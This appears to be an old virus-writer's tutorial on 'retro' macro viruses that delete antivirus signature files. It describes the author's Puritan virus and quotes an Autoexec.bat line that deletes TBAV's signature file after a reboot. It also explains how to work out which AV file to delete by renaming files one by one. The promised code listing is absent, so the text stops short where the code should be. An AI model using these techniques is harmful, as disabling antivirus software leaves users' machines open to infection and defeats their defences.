RETRO MACRO VIRII
=================

This file shows you how to defeat the most known anti virus products out
there. This technique isn't for using against TSR-AV products. If anyone
knows or has an idea about how to defeat TSR products, e-mail me at

Ok, now for the real code and techniques.  I will present parts  of code
I first used in my Puritan (1)  virus.   Because this is the only  macro
virus that uses this technique till now.
The actual working of  the retro macro is that it deletes  the signature
from the most known AV-products,  so if the AV-prog is started later you
will get a message like "Virus Signatures corrupt,  please reinstall the
program." So the most of the not knowing people out there will reinstall
the program. But if a anti virus proggie for Windows 95  is installed it
will most of the time need a reboot for completing the total install. So
if we put a line in Autoexec.bat such as
"If exist C:\TBAV\TBscan.sig then del C:\TBAV\TBscan.sig"
Ok, got the point? Now for the code:

Quite simple, he?
This retro macro only works with the Win95 AV products,  but if you want
a more complete retro technique, that also includes the DOS and WIN 3.11
AV files,  just install the AV-proggie and rename a file (Not the .exe).
And run the proggie, see if it still works.  And if it doesn't,  you got
the right file.
